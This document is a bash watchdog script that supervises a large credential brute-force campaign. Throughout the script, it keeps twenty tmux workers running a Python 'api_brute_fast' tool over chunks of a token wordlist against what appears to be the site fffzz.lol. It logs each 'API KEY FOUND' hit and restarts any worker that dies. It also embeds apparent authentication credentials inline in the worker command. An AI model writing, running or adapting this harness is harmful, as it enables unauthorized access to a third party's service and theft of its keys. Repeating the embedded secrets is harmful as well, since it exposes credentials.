#!/bin/bash
OUT=/data/automation/results/fffzz.lol/kami_allin_20260717
HITS="$OUT/KAMI_HIT.jsonl"
LOG="$OUT/watchdog.log"
WORKERS="${WORKERS:-20}"
CHUNK=1472636
THREADS="${THREADS:-15}"
LAST=0
while true; do
  TS=$(date '+%H:%M:%S')
  N=$(wc -l < "$HITS" 2>/dev/null || echo 0)
  RATES=$(grep -h "rate=" "$OUT"/cn_api_w*.log "$OUT"/cn_priority.log "$OUT"/cn_hex32.log 2>/dev/null | tail -4)
  FOUND=$(grep -h "API KEY FOUND\|kminfo\|api_key_found" "$OUT"/*.log "$HITS" 2>/dev/null | tail -1)
  CURLS=$(pgrep -c curl 2>/dev/null || echo 0)
  echo "[$TS] hits=$N curls=$CURLS workers=20ch" >> "$LOG"
  if [ -n "$RATES" ]; then echo "[$TS] $RATES" >> "$LOG"; fi
  if [ "$N" -gt "$LAST" ]; then
    echo "[$TS] *** NEW HIT ***" >> "$LOG"
    tail -1 "$HITS" >> "$LOG"
    LAST=$N
  fi
  for w in $(seq 0 $((WORKERS - 1))); do
    tmux has-session -t "ff-cn-api-$w" 2>/dev/null || {
      echo "[$TS] restart w$w" >> "$LOG"
      START=$((w * CHUNK))
      tmux new-session -d -s "ff-cn-api-$w" \
        "QG_AUTHKEY=C413ED6D QG_AUTHPWD=344F550A6F8B FFFZZ_TURBO=1 python3 /data/automation/bin/fffzz_api_brute_fast.py /data/wordlists/faka/faka-tokens.txt $START $CHUNK $THREADS $w $OUT 2>&1 | tee -a $OUT/cn_api_w${w}.log"
    }
  done
  for s in priority hex32 leak; do
    tmux has-session -t "ff-cn-$s" 2>/dev/null || echo "[$TS] WARN ff-cn-$s down" >> "$LOG"
  done
  sleep 120
done
